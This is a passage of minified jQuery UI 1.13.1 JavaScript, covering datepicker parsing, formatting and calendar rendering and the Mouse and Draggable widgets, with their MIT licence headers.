RegExp("^\\d{"+e+","+c+"}"),b=f.substring(p).match(g);if(!b)throw"Missing number at position "+p;return p+=b[0].length,parseInt(b[0],10)},r=function(b,c,d){var a=-1,e=$.map(q(b)?d:c,function(a,b){return[[b,a]]}).sort(function(a,b){return-(a[1].length-b[1].length)});if($.each(e,function(d,c){var b=c[1];if(f.substr(p,b.length).toLowerCase()===b.toLowerCase())return a=c[0],p+=b.length,!1}),-1!==a)return a+1;throw"Unknown name at position "+p},n=function(){if(f.charAt(p)!==i.charAt(h))throw"Unexpected literal at position "+p;p++};for(h=0;h<i.length;h++)if(m)"'"!==i.charAt(h)||q("'")?n():m=!1;else switch(i.charAt(h)){case"d":e=g("d");break;case"D":r("D",t,u);break;case"o":l=g("o");break;case"m":d=g("m");break;case"M":d=r("M",v,w);break;case"y":a=g("y");break;case"@":a=(c=new Date(g("@"))).getFullYear(),d=c.getMonth()+1,e=c.getDate();break;case"!":a=(c=new Date((g("!")-this._ticksTo1970)/1e4)).getFullYear(),d=c.getMonth()+1,e=c.getDate();break;case"'":q("'")?n():m=!0;break;default:n()}if(p<f.length&&(j=f.substr(p),!/^\s+/.test(j)))throw"Extra/unparsed characters found in date: "+j;if(-1===a?a=new Date().getFullYear():a<100&&(a+=new Date().getFullYear()-new Date().getFullYear()%100+(a<=s?0:-100)),l> -1)for(d=1,e=l;!(e<=(o=this._getDaysInMonth(a,d-1)));)d++,e-=o;if((c=this._daylightSavingAdjust(new Date(a,d-1,e))).getFullYear()!==a||c.getMonth()+1!==d||c.getDate()!==e)throw"Invalid date";return c},ATOM:"yy-mm-dd",COOKIE:"D, dd M yy",ISO_8601:"yy-mm-dd",RFC_822:"D, d M y",RFC_850:"DD, dd-M-y",RFC_1036:"D, d M y",RFC_1123:"D, d M yy",RFC_2822:"D, d M yy",RSS:"D, d M y",TICKS:"!",TIMESTAMP:"@",W3C:"yy-mm-dd",_ticksTo1970:(718685+Math.floor(492.5)-Math.floor(19.7)+Math.floor(4.925))*864e9,formatDate:function(e,a,c){if(!a)return"";var d,j=(c?c.dayNamesShort:null)||this._defaults.dayNamesShort,k=(c?c.dayNames:null)||this._defaults.dayNames,l=(c?c.monthNamesShort:null)||this._defaults.monthNamesShort,m=(c?c.monthNames:null)||this._defaults.monthNames,f=function(b){var a=d+1<e.length&&e.charAt(d+1)===b;return a&&d++,a},g=function(b,c,d){var a=""+c;if(f(b))for(;a.length<d;)a="0"+a;return a},i=function(b,a,c,d){return f(b)?d[a]:c[a]},b="",h=!1;if(a)for(d=0;d<e.length;d++)if(h)"'"!==e.charAt(d)||f("'")?b+=e.charAt(d):h=!1;else switch(e.charAt(d)){case"d":b+=g("d",a.getDate(),2);break;case"D":b+=i("D",a.getDay(),j,k);break;case"o":b+=g("o",Math.round((new Date(a.getFullYear(),a.getMonth(),a.getDate()).getTime()-new Date(a.getFullYear(),0,0).getTime())/864e5),3);break;case"m":b+=g("m",a.getMonth()+1,2);break;case"M":b+=i("M",a.getMonth(),l,m);break;case"y":b+=f("y")?a.getFullYear():(a.getFullYear()%100<10?"0":"")+a.getFullYear()%100;break;case"@":b+=a.getTime();break;case"!":b+=1e4*a.getTime()+this._ticksTo1970;break;case"'":f("'")?b+="'":h=!0;break;default:b+=e.charAt(d)}return b},_possibleChars:function(b){var a,c="",d=!1,e=function(d){var c=a+1<b.length&&b.charAt(a+1)===d;return c&&a++,c};for(a=0;a<b.length;a++)if(d)"'"!==b.charAt(a)||e("'")?c+=b.charAt(a):d=!1;else switch(b.charAt(a)){case"d":case"m":case"y":case"@":c+="0123456789";break;case"D":case"M":return null;case"'":e("'")?c+="'":d=!0;break;default:c+=b.charAt(a)}return c},_get:function(b,a){return void 0!==b.settings[a]?b.settings[a]:this._defaults[a]},_setDateFromField:function(a,e){if(a.input.val()!==a.lastVal){var f=this._get(a,"dateFormat"),c=a.lastVal=a.input?a.input.val():null,d=this._getDefaultDate(a),b=d,g=this._getFormatConfig(a);try{b=this.parseDate(f,c,g)||d}catch(h){c=e?"":c}a.selectedDay=b.getDate(),a.drawMonth=a.selectedMonth=b.getMonth(),a.drawYear=a.selectedYear=b.getFullYear(),a.currentDay=c?b.getDate():0,a.currentMonth=c?b.getMonth():0,a.currentYear=c?b.getFullYear():0,this._adjustInstDate(a)}},_getDefaultDate:function(a){return this._restrictMinMax(a,this._determineDate(a,this._get(a,"defaultDate"),new Date))},_determineDate:function(f,b,c){var d=function(b){var a=new Date;return a.setDate(a.getDate()+b),a},e=function(c){try{return $.datepicker.parseDate($.datepicker._get(f,"dateFormat"),c,$.datepicker._getFormatConfig(f))}catch(i){}for(var g=(c.toLowerCase().match(/^c/)?$.datepicker._getDate(f):null)||new Date,d=g.getFullYear(),e=g.getMonth(),a=g.getDate(),h=/([+\-]?[0-9]+)\s*(d|D|w|W|m|M|y|Y)?/g,b=h.exec(c);b;){switch(b[2]||"d"){case"d":case"D":a+=parseInt(b[1],10);break;case"w":case"W":a+=7*parseInt(b[1],10);break;case"m":case"M":e+=parseInt(b[1],10),a=Math.min(a,$.datepicker._getDaysInMonth(d,e));break;case"y":case"Y":d+=parseInt(b[1],10),a=Math.min(a,$.datepicker._getDaysInMonth(d,e))}b=h.exec(c)}return new Date(d,e,a)},a=null==b||""===b?c:"string"==typeof b?e(b):"number"==typeof b?isNaN(b)?c:d(b):new Date(b.getTime());return(a=a&&"Invalid Date"===a.toString()?c:a)&&(a.setHours(0),a.setMinutes(0),a.setSeconds(0),a.setMilliseconds(0)),this._daylightSavingAdjust(a)},_daylightSavingAdjust:function(a){return a?(a.setHours(a.getHours()>12?a.getHours()+2:0),a):null},_setDate:function(a,c,d){var e=a.selectedMonth,f=a.selectedYear,b=this._restrictMinMax(a,this._determineDate(a,c,new Date));a.selectedDay=a.currentDay=b.getDate(),a.drawMonth=a.selectedMonth=a.currentMonth=b.getMonth(),a.drawYear=a.selectedYear=a.currentYear=b.getFullYear(),e===a.selectedMonth&&f===a.selectedYear||d||this._notifyChange(a),this._adjustInstDate(a),a.input&&a.input.val(c?this._formatDate(a):"")},_getDate:function(a){return!a.currentYear||a.input&&""===a.input.val()?null:this._daylightSavingAdjust(new Date(a.currentYear,a.currentMonth,a.currentDay))},_attachHandlers:function(a){var b=this._get(a,"stepMonths"),c="#"+a.id.replace(/\\\\/g,"\\");a.dpDiv.find("[data-handler]").map(function(){$(this).on(this.getAttribute("data-event"),{prev:function(){$.datepicker._adjustDate(c,-b,"M")},next:function(){$.datepicker._adjustDate(c,+b,"M")},hide:function(){$.datepicker._hideDatepicker()},today:function(){$.datepicker._gotoToday(c)},selectDay:function(){return $.datepicker._selectDay(c,+this.getAttribute("data-month"),+this.getAttribute("data-year"),this),!1},selectMonth:function(){return $.datepicker._selectMonthYear(c,this,"M"),!1},selectYear:function(){return $.datepicker._selectMonthYear(c,this,"Y"),!1}}[this.getAttribute("data-handler")])})},_generateHTML:function(a){var r,i,z,j,A,s,B,u,C,k,D,U,V,W,X,E,v,Y,F,w,h,o,G,p,H,l,e,I,J,K,L,M,N,b,O,P,t,m,x,Q=new Date,R=this._daylightSavingAdjust(new Date(Q.getFullYear(),Q.getMonth(),Q.getDate())),f=this._get(a,"isRTL"),ab=this._get(a,"showButtonPanel"),Z=this._get(a,"hideIfNoPrevNext"),S=this._get(a,"navigationAsDateFormat"),g=this._getNumberOfMonths(a),ac=this._get(a,"showCurrentAtPos"),aa=this._get(a,"stepMonths"),T=1!==g[0]||1!==g[1],y=this._daylightSavingAdjust(a.currentDay?new Date(a.currentYear,a.currentMonth,a.currentDay):new Date(9999,9,9)),q=this._getMinMaxDate(a,"min"),n=this._getMinMaxDate(a,"max"),c=a.drawMonth-ac,d=a.drawYear;if(c<0&&(c+=12,d--),n)for(r=this._daylightSavingAdjust(new Date(n.getFullYear(),n.getMonth()-g[0]*g[1]+1,n.getDate())),r=q&&r<q?q:r;this._daylightSavingAdjust(new Date(d,c,1))>r;)--c<0&&(c=11,d--);for(a.drawMonth=c,a.drawYear=d,i=this._get(a,"prevText"),i=S?this.formatDate(i,this._daylightSavingAdjust(new Date(d,c-aa,1)),this._getFormatConfig(a)):i,z=this._canAdjustMonth(a,-1,d,c)?$("<a>").attr({class:"ui-datepicker-prev ui-corner-all","data-handler":"prev","data-event":"click",title:i}).append($("<span>").addClass("ui-icon ui-icon-circle-triangle-"+(f?"e":"w")).text(i))[0].outerHTML:Z?"":$("<a>").attr({class:"ui-datepicker-prev ui-corner-all ui-state-disabled",title:i}).append($("<span>").addClass("ui-icon ui-icon-circle-triangle-"+(f?"e":"w")).text(i))[0].outerHTML,j=this._get(a,"nextText"),j=S?this.formatDate(j,this._daylightSavingAdjust(new Date(d,c+aa,1)),this._getFormatConfig(a)):j,A=this._canAdjustMonth(a,1,d,c)?$("<a>").attr({class:"ui-datepicker-next ui-corner-all","data-handler":"next","data-event":"click",title:j}).append($("<span>").addClass("ui-icon ui-icon-circle-triangle-"+(f?"w":"e")).text(j))[0].outerHTML:Z?"":$("<a>").attr({class:"ui-datepicker-next ui-corner-all ui-state-disabled",title:j}).append($("<span>").attr("class","ui-icon ui-icon-circle-triangle-"+(f?"w":"e")).text(j))[0].outerHTML,s=this._get(a,"currentText"),B=this._get(a,"gotoCurrent")&&a.currentDay?y:R,s=S?this.formatDate(s,B,this._getFormatConfig(a)):s,u="",a.inline||(u=$("<button>").attr({type:"button",class:"ui-datepicker-close ui-state-default ui-priority-primary ui-corner-all","data-handler":"hide","data-event":"click"}).text(this._get(a,"closeText"))[0].outerHTML),C="",ab&&(C=$("<div class='ui-datepicker-buttonpane ui-widget-content'>").append(f?u:"").append(this._isInRange(a,B)?$("<button>").attr({type:"button",class:"ui-datepicker-current ui-state-default ui-priority-secondary ui-corner-all","data-handler":"today","data-event":"click"}).text(s):"").append(f?"":u)[0].outerHTML),k=parseInt(this._get(a,"firstDay"),10),k=isNaN(k)?0:k,D=this._get(a,"showWeek"),U=this._get(a,"dayNames"),V=this._get(a,"dayNamesMin"),W=this._get(a,"monthNames"),X=this._get(a,"monthNamesShort"),E=this._get(a,"beforeShowDay"),v=this._get(a,"showOtherMonths"),Y=this._get(a,"selectOtherMonths"),F=this._getDefaultDate(a),w="",o=0;o<g[0];o++){for(p=0,G="",this.maxRows=4;p<g[1];p++){if(H=this._daylightSavingAdjust(new Date(d,c,a.selectedDay)),l=" ui-corner-all",e="",T){if(e+="<div class='ui-datepicker-group",g[1]>1)switch(p){case 0:e+=" ui-datepicker-group-first",l=" ui-corner-"+(f?"right":"left");break;case g[1]-1:e+=" ui-datepicker-group-last",l=" ui-corner-"+(f?"left":"right");break;default:e+=" ui-datepicker-group-middle",l=""}e+="'>"}for(e+="<div class='ui-datepicker-header ui-widget-header ui-helper-clearfix"+l+"'>"+(/all|left/.test(l)&&0===o?f?A:z:"")+(/all|right/.test(l)&&0===o?f?z:A:"")+this._generateMonthYearHeader(a,c,d,q,n,o>0||p>0,W,X)+"</div><table class='ui-datepicker-calendar'><thead><tr>",I=D?"<th class='ui-datepicker-week-col'>"+this._get(a,"weekHeader")+"</th>":"",h=0;h<7;h++)J=(h+k)%7,I+="<th scope='col'"+((h+k+6)%7>=5?" class='ui-datepicker-week-end'":"")+"><span title='"+U[J]+"'>"+V[J]+"</span></th>";for(e+=I+"</tr></thead><tbody>",K=this._getDaysInMonth(d,c),d===a.selectedYear&&c===a.selectedMonth&&(a.selectedDay=Math.min(a.selectedDay,K)),L=(this._getFirstDayOfMonth(d,c)-k+7)%7,M=Math.ceil((L+K)/7),N=T&&this.maxRows>M?this.maxRows:M,this.maxRows=N,b=this._daylightSavingAdjust(new Date(d,c,1-L)),O=0;O<N;O++){for(e+="<tr>",P=D?"<td class='ui-datepicker-week-col'>"+this._get(a,"calculateWeek")(b)+"</td>":"",h=0;h<7;h++)t=E?E.apply(a.input?a.input[0]:null,[b]):[!0,""],m=b.getMonth()!==c,x=m&&!Y||!t[0]||q&&b<q||n&&b>n,P+="<td class='"+((h+k+6)%7>=5?" ui-datepicker-week-end":"")+(m?" ui-datepicker-other-month":"")+(b.getTime()===H.getTime()&&c===a.selectedMonth&&a._keyEvent||F.getTime()===b.getTime()&&F.getTime()===H.getTime()?" "+this._dayOverClass:"")+(x?" "+this._unselectableClass+" ui-state-disabled":"")+(m&&!v?"":" "+t[1]+(b.getTime()===y.getTime()?" "+this._currentClass:"")+(b.getTime()===R.getTime()?" ui-datepicker-today":""))+"'"+((!m||v)&&t[2]?" title='"+t[2].replace(/'/g,"&#39;")+"'":"")+(x?"":" data-handler='selectDay' data-event='click' data-month='"+b.getMonth()+"' data-year='"+b.getFullYear()+"'")+">"+(m&&!v?"&#xa0;":x?"<span class='ui-state-default'>"+b.getDate()+"</span>":"<a class='ui-state-default"+(b.getTime()===R.getTime()?" ui-state-highlight":"")+(b.getTime()===y.getTime()?" ui-state-active":"")+(m?" ui-priority-secondary":"")+"' href='#' aria-current='"+(b.getTime()===y.getTime()?"true":"false")+"' data-date='"+b.getDate()+"'>"+b.getDate()+"</a>")+"</td>",b.setDate(b.getDate()+1),b=this._daylightSavingAdjust(b);e+=P+"</tr>"}++c>11&&(c=0,d++),e+="</tbody></table>"+(T?"</div>"+(g[0]>0&&p===g[1]-1?"<div class='ui-datepicker-row-break'></div>":""):""),G+=e}w+=G}return w+=C,a._keyEvent=!1,w},_generateMonthYearHeader:function(a,n,i,f,g,j,s,t){var o,p,c,k,u,q,b,h,l=this._get(a,"changeMonth"),m=this._get(a,"changeYear"),r=this._get(a,"showMonthAfterYear"),v=this._get(a,"selectMonthLabel"),w=this._get(a,"selectYearLabel"),d="<div class='ui-datepicker-title'>",e="";if(j||!l)e+="<span class='ui-datepicker-month'>"+s[n]+"</span>";else{for(o=f&&f.getFullYear()===i,p=g&&g.getFullYear()===i,e+="<select class='ui-datepicker-month' aria-label='"+v+"' data-handler='selectMonth' data-event='change'>",c=0;c<12;c++)(!o||c>=f.getMonth())&&(!p||c<=g.getMonth())&&(e+="<option value='"+c+"'"+(c===n?" selected='selected'":"")+">"+t[c]+"</option>");e+="</select>"}if(r||(d+=e+(j||!(l&&m)?"&#xa0;":"")),!a.yearshtml){if(a.yearshtml="",j||!m)d+="<span class='ui-datepicker-year'>"+i+"</span>";else{for(k=this._get(a,"yearRange").split(":"),u=new Date().getFullYear(),h=Math.max(b=(q=function(a){var b=a.match(/c[+\-].*/)?i+parseInt(a.substring(1),10):a.match(/[+\-].*/)?u+parseInt(a,10):parseInt(a,10);return isNaN(b)?u:b})(k[0]),q(k[1]||"")),b=f?Math.max(b,f.getFullYear()):b,h=g?Math.min(h,g.getFullYear()):h,a.yearshtml+="<select class='ui-datepicker-year' aria-label='"+w+"' data-handler='selectYear' data-event='change'>";b<=h;b++)a.yearshtml+="<option value='"+b+"'"+(b===i?" selected='selected'":"")+">"+b+"</option>";a.yearshtml+="</select>",d+=a.yearshtml,a.yearshtml=null}}return d+=this._get(a,"yearSuffix"),r&&(d+=(j||!(l&&m)?"&#xa0;":"")+e),d+="</div>"},_adjustInstDate:function(a,c,b){var e=a.selectedYear+("Y"===b?c:0),f=a.selectedMonth+("M"===b?c:0),g=Math.min(a.selectedDay,this._getDaysInMonth(e,f))+("D"===b?c:0),d=this._restrictMinMax(a,this._daylightSavingAdjust(new Date(e,f,g)));a.selectedDay=d.getDate(),a.drawMonth=a.selectedMonth=d.getMonth(),a.drawYear=a.selectedYear=d.getFullYear(),("M"===b||"Y"===b)&&this._notifyChange(a)},_restrictMinMax:function(c,d){var a=this._getMinMaxDate(c,"min"),b=this._getMinMaxDate(c,"max"),e=a&&d<a?a:d;return b&&e>b?b:e},_notifyChange:function(a){var b=this._get(a,"onChangeMonthYear");b&&b.apply(a.input?a.input[0]:null,[a.selectedYear,a.selectedMonth+1,a])},_getNumberOfMonths:function(b){var a=this._get(b,"numberOfMonths");return null==a?[1,1]:"number"==typeof a?[1,a]:a},_getMinMaxDate:function(a,b){return this._determineDate(a,this._get(a,b+"Date"),null)},_getDaysInMonth:function(a,b){return 32-this._daylightSavingAdjust(new Date(a,b,32)).getDate()},_getFirstDayOfMonth:function(a,b){return new Date(a,b,1).getDay()},_canAdjustMonth:function(c,b,e,f){var d=this._getNumberOfMonths(c),a=this._daylightSavingAdjust(new Date(e,f+(b<0?b:d[0]*d[1]),1));return b<0&&a.setDate(this._getDaysInMonth(a.getFullYear(),a.getMonth())),this._isInRange(c,a)},_isInRange:function(e,b){var a,f,g=this._getMinMaxDate(e,"min"),h=this._getMinMaxDate(e,"max"),c=null,d=null,i=this._get(e,"yearRange");return i&&(a=i.split(":"),f=new Date().getFullYear(),c=parseInt(a[0],10),d=parseInt(a[1],10),a[0].match(/[+\-].*/)&&(c+=f),a[1].match(/[+\-].*/)&&(d+=f)),(!g||b.getTime()>=g.getTime())&&(!h||b.getTime()<=h.getTime())&&(!c||b.getFullYear()>=c)&&(!d||b.getFullYear()<=d)},_getFormatConfig:function(a){var b=this._get(a,"shortYearCutoff");return{shortYearCutoff:b="string"!=typeof b?b:new Date().getFullYear()%100+parseInt(b,10),dayNamesShort:this._get(a,"dayNamesShort"),dayNames:this._get(a,"dayNames"),monthNamesShort:this._get(a,"monthNamesShort"),monthNames:this._get(a,"monthNames")}},_formatDate:function(a,b,c,d){b||(a.currentDay=a.selectedDay,a.currentMonth=a.selectedMonth,a.currentYear=a.selectedYear);var e=b?"object"==typeof b?b:this._daylightSavingAdjust(new Date(d,c,b)):this._daylightSavingAdjust(new Date(a.currentYear,a.currentMonth,a.currentDay));return this.formatDate(this._get(a,"dateFormat"),e,this._getFormatConfig(a))}}),$.fn.datepicker=function(a){if(!this.length)return this;$.datepicker.initialized||($(document).on("mousedown",$.datepicker._checkExternalClick),$.datepicker.initialized=!0),0===$("#"+$.datepicker._mainDivId).length&&$("body").append($.datepicker.dpDiv);var b=Array.prototype.slice.call(arguments,1);return"string"==typeof a&&("isDisabled"===a||"getDate"===a||"widget"===a)||"option"===a&&2===arguments.length&&"string"==typeof arguments[1]?$.datepicker["_"+a+"Datepicker"].apply($.datepicker,[this[0]].concat(b)):this.each(function(){"string"==typeof a?$.datepicker["_"+a+"Datepicker"].apply($.datepicker,[this].concat(b)):$.datepicker._attachDatepicker(this,a)})},$.datepicker=new h,$.datepicker.initialized=!1,$.datepicker.uuid=new Date().getTime(),$.datepicker.version="1.13.1",$.datepicker,$.ui.ie=!!/msie [\w.]+/.exec(navigator.userAgent.toLowerCase());/*!
 * jQuery UI Mouse 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ var S=!1;/*!
 * jQuery UI Spinner 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ function c(a){return function(){var b=this.element.val();a.apply(this,arguments),this._refresh(),b!==this.element.val()&&this._trigger("change")}}$(document).on("mouseup",function(){S=!1}),$.widget("ui.mouse",{version:"1.13.1",options:{cancel:"input, textarea, button, select, option",distance:1,delay:0},_mouseInit:function(){var a=this;this.element.on("mousedown."+this.widgetName,function(b){return a._mouseDown(b)}).on("click."+this.widgetName,function(b){if(!0===$.data(b.target,a.widgetName+".preventClickEvent"))return $.removeData(b.target,a.widgetName+".preventClickEvent"),b.stopImmediatePropagation(),!1}),this.started=!1},_mouseDestroy:function(){this.element.off("."+this.widgetName),this._mouseMoveDelegate&&this.document.off("mousemove."+this.widgetName,this._mouseMoveDelegate).off("mouseup."+this.widgetName,this._mouseUpDelegate)},_mouseDown:function(a){if(!S){this._mouseMoved=!1,this._mouseStarted&&this._mouseUp(a),this._mouseDownEvent=a;var d=this,b=1===a.which,c="string"==typeof this.options.cancel&&!!a.target.nodeName&&$(a.target).closest(this.options.cancel).length;return!(b&&!c&&this._mouseCapture(a))||((this.mouseDelayMet=!this.options.delay,this.mouseDelayMet||(this._mouseDelayTimer=setTimeout(function(){d.mouseDelayMet=!0},this.options.delay)),this._mouseDistanceMet(a)&&this._mouseDelayMet(a)&&(this._mouseStarted=!1!==this._mouseStart(a),!this._mouseStarted))?(a.preventDefault(),!0):(!0===$.data(a.target,this.widgetName+".preventClickEvent")&&$.removeData(a.target,this.widgetName+".preventClickEvent"),this._mouseMoveDelegate=function(a){return d._mouseMove(a)},this._mouseUpDelegate=function(a){return d._mouseUp(a)},this.document.on("mousemove."+this.widgetName,this._mouseMoveDelegate).on("mouseup."+this.widgetName,this._mouseUpDelegate),a.preventDefault(),S=!0,!0))}},_mouseMove:function(a){if(this._mouseMoved){if($.ui.ie&&(!document.documentMode||document.documentMode<9)&&!a.button)return this._mouseUp(a);if(!a.which){if(a.originalEvent.altKey||a.originalEvent.ctrlKey||a.originalEvent.metaKey||a.originalEvent.shiftKey)this.ignoreMissingWhich=!0;else if(!this.ignoreMissingWhich)return this._mouseUp(a)}}return((a.which||a.button)&&(this._mouseMoved=!0),this._mouseStarted)?(this._mouseDrag(a),a.preventDefault()):(this._mouseDistanceMet(a)&&this._mouseDelayMet(a)&&(this._mouseStarted=!1!==this._mouseStart(this._mouseDownEvent,a),this._mouseStarted?this._mouseDrag(a):this._mouseUp(a)),!this._mouseStarted)},_mouseUp:function(a){this.document.off("mousemove."+this.widgetName,this._mouseMoveDelegate).off("mouseup."+this.widgetName,this._mouseUpDelegate),this._mouseStarted&&(this._mouseStarted=!1,a.target===this._mouseDownEvent.target&&$.data(a.target,this.widgetName+".preventClickEvent",!0),this._mouseStop(a)),this._mouseDelayTimer&&(clearTimeout(this._mouseDelayTimer),delete this._mouseDelayTimer),this.ignoreMissingWhich=!1,S=!1,a.preventDefault()},_mouseDistanceMet:function(a){return Math.max(Math.abs(this._mouseDownEvent.pageX-a.pageX),Math.abs(this._mouseDownEvent.pageY-a.pageY))>=this.options.distance},_mouseDelayMet:function(){return this.mouseDelayMet},_mouseStart:function(){},_mouseDrag:function(){},_mouseStop:function(){},_mouseCapture:function(){return!0}}),$.ui.plugin={add:function(d,e,c){var a,b=$.ui[d].prototype;for(a in c)b.plugins[a]=b.plugins[a]||[],b.plugins[a].push([e,c[a]])},call:function(a,d,e,f){var b,c=a.plugins[d];if(c&&(f||a.element[0].parentNode&&11!==a.element[0].parentNode.nodeType))for(b=0;b<c.length;b++)a.options[c[b][0]]&&c[b][1].apply(a.element,e)}},$.ui.safeBlur=function(a){a&&"body"!==a.nodeName.toLowerCase()&&$(a).trigger("blur")},/*!
 * jQuery UI Draggable 1.13.1
 * http://jqueryui.com
 *
 * Copyright jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */ $.widget("ui.draggable",$.ui.mouse,{version:"1.13.1",widgetEventPrefix:"drag",options:{addClasses:!0,appendTo:"parent",axis:!1,connectToSortable:!1,containment:!1,cursor:"auto",cursorAt:!1,grid:!1,handle:!1,helper:"original",iframeFix:!1,opacity:!1,refreshPositions:!1,revert:!1,revertDuration:500,scope:"default",scroll:!0,scrollSensitivity:20,scrollSpeed:20,snap:!1,snapMode:"both",snapTolerance:20,stack:!1,zIndex:!1,drag:null,start:null,stop:null},_create:function(){"original"===this.options.helper&&this._setPositionRelative(),this.options.addClasses&&this._addClass("ui-draggable"),this._setHandleClassName(),this._mouseInit()},_setOption:function(a,b){this._super(a,b),"handle"===a&&(this._removeHandleClassName(),this._setHandleClassName())},_destroy:function(){if((this.helper||this.element).is(".ui-draggable-dragging")){this.destroyOnClear=!0;return}this._removeHandleClassName(),this._mouseDestroy()},_mouseCapture:function(a){var b=this.options;return!this.helper&&!b.disabled&&!($(a.target).closest(".ui-resizable-handle").length>0)&&(this.handle=this._getHandle(a),!!this.handle&&(this._blurActiveElement(a),this._blockFrames(!0===b.iframeFix?"iframe":b.iframeFix),!0))},_blockFrames:function(a){this.iframeBlocks=this.document.find(a).map(function(){var a=$(this);return $("<div>").css("position","absolute").appendTo(a.parent()).outerWidth(a.outerWidth()).outerHeight(a.outerHeight()).offset(a.offset())[0]})},_unblockFrames:function(){this.iframeBlocks&&(this.iframeBlocks.remove(),delete this.iframeBlocks)},_blurActiveElement:function(b){var a=$.ui.safeActiveElement(this.document[0]);$(b.target).closest(a).length||$.ui.safeBlur(a)},_mouseStart:function(a){var b=this.options;return(this.helper=this._createHelper(a),this._addClass(this.helper,"ui-draggable-dragging"),this._cacheHelperProportions(),$.ui.ddmanager&&($.ui.ddmanager.current=this),this._cacheMargins(),this.cssPosition=this.helper.css("position"),this.scrollParent=this.helper.scrollParent(!0),this.offsetParent=this.helper.offsetParent(),this.hasFixedAncestor=this.helper.parents().filter(function(){return"fixed"===$(this).css("position")}).length>0,this.positionAbs=this.element.offset(),this._refreshOffsets(a),this.originalPosition=this.position=this._generatePosition(a,!1),this.originalPageX=a.pageX,this.originalPageY=a.pageY,b.cursorAt&&this._adjustOffsetFromHelper(b.cursorAt),this._setContainment(),!1===this._trigger("start",a))?(this._clear(),!1):(this._cacheHelperProportions(),$.ui.ddmanager&&!b.dropBehaviour&&$.ui.ddmanager.prepareOffsets(this,a),this._mouseDrag(a,!0),$.ui.ddmanager&&$.ui.ddmanager.dragStart(this,a),!0)},_refreshOffsets:function(a){this.offset={top:this.positionAbs.top-this.margins.top,left:this.positionAbs.left-this.margins.left,scroll:!1,parent:this._getParentOffset(),relative:this._getRelativeOffset()},this.offset.click={left:a.pageX-this.offset.left,top:a.pageY-this.offset.top}},_mouseDrag:function(a,c){if(this.hasFixedAncestor&&(this.offset.parent=this._getParentOffset()),this.position=this._generatePosition(a,!0),this.positionAbs=this._convertPositionTo("absolute"),!c){var b=this._uiHash();if(!1===this._trigger("drag",a,b))return this._mouseUp(new $.Event("mouseup",a)),!1;this.position=b.position}return this.helper[0].style.left=this.position.left+"px",this.helper[0].style.top=this.position.top+"px",$.ui.ddmanager&&$.ui.ddmanager.drag(this,a),!1},_mouseStop:function(b){var c=this,a=!1;return $.ui.ddmanager&&!this.options.dropBehaviour&&(a=$.ui.ddmanager.drop(this,b)),this.dropped&&(a=this.dropped,this.dropped=!1),"invalid"===this.options.revert&&!a||"valid"===this.options.revert&&a|| !0===this.options.revert||"function"==typeof this.options.revert&&this.options.revert.call(this.element,a)?$(this.helper).animate(this.originalPosition,parseInt(this.options.revertDuration,10),function(){!1!==c._trigger("stop",b)&&c._clear()}):!1!==this._trigger("stop",b)&&this._clear(),!1},_mouseUp:function(a){return this._unblockFrames(),$.ui.ddmanager&&$.ui.ddmanager.dragStop(this,a),this.handleElement.is(a.target)&&this.element.trigger("focus"),$.ui.mouse.prototype._mouseUp.call(this,a)},cancel:function(){return this.helper.is(".ui-draggable-dragging")?this._mouseUp(new $.Event("mouseup",{target:this.element[0]})):this._clear(),this},_getHandle:function(a){return!this.options.handle||!!$(a.target).closest(this.element.find(this.options.handle)).length},_setHandleClassName:function(){this.handleElement=this.options.handle?this.element.find(this.options.handle):this.element,this._addClass(this.handleElement,"ui-draggable-handle")},_removeHandleClassName:function(){this._removeClass(this.handleElement,"ui-draggable-handle")},_createHelper:function(d){var b=this.options,c="function"==typeof b.helper,a=c?$(b.helper.apply(this.element[0],[d])):"clone"===b.helper?this.element.clone().removeAttr("id"):this.element;return a.parents("body").length||a.appendTo("parent"===b.appendTo?this.element[0].parentNode:b.appendTo),c&&a[0]===this.element[0]&&this._setPositionRelative(),a[0]===this.element[0]||/(fixed|absolute)/.test(a.css("position"))||a.css("position","absolute"),a},_setPositionRelative:function(){/^(?:r|a|f)/.test(this.element.css("position"))||(this.element[0].style.position="relative")},_adjustOffsetFromHelper:function(a){"string"==typeof a&&(a=a.split(" ")),Array.isArray(a)&&(a={left:+a[0],top:+a[1]||0}),"left"in a&&(this.offset.click.left=a.left+this.margins.left),"right"in a&&(this.offset.click.left=this.helperProportions.width-a.right+this.margins.left),"top"in a&&(this.offset.click.top=a.top+this.margins.top),"bottom"in a&&(this.offset.click.top=this.helperProportions.height-a.bottom+this.margins.top)},_isRootNode:function(a){return/(html|body)/i.test(a.tagName)||a===this.document[0]},_getParentOffset:function(){var a=this.offsetParent.offset(),b=this.document[0];return"absolute"===this.cssPosition&&this.scrollParent[0]!==b&&$.contains(this.scrollParent[0],this.offsetParent[0])&&(a.left+=this.scrollParent.scrollLeft(),a.top+=this.scrollParent.scrollTop()),this._isRootNode(this.offsetParent[0])&&(a={top:0,left:0}),{top:a.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:a.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if("relative"!==this.cssPosition)return{top:0,left:0};var a=this.element.position(),b=this._isRootNode(this.scrollParent[0]);return{top:a.top-(parseInt(this.helper.css("top"),10)||0)+(b?0:this.scrollParent.scrollTop()),left:a.left-(parseInt(this.helper.css("left"),10)||0)+(b?0:this.scrollParent.scrollLeft())}},_cacheMargins:function(){this.margins={left:parseInt(this.element.css("marginLeft"),10)||0,top:parseInt(this.element.css("marginTop"),10)||0,right:parseInt(this.element.css("marginRight"),10)||0,bottom:parseInt(this.element.css("marginBottom"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},_setContainment:function(){var 